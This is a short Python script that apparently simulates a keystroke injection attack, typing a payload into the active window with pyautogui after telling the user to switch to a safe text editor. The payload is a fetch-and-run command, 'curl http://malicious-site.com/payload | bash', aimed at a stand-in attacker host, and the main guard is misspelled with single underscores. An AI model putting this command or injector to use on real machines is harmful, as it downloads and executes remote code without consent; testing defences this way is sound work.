simulator.py
import pyautogui
import time

PAYLOAD = (
    "echo '[ATTACK SIMULATION]' && "
    "curl http://malicious-site.com/payload | bash\n"
)

def run_attack_simulation(interval=0.01):
    print("SIMULATOR: Starting 'Malicious' Injection in 5 seconds...")
    print("Switch to a SAFE window (text editor recommended).")
    time.sleep(5)

    print(f"SIMULATOR: Injecting payload at {interval*1000:.0f}ms per key...")
    pyautogui.write(PAYLOAD, interval=interval)

    print("SIMULATOR: Injection complete.")

if _name_ == "_main_":
    run_attack_simulation()
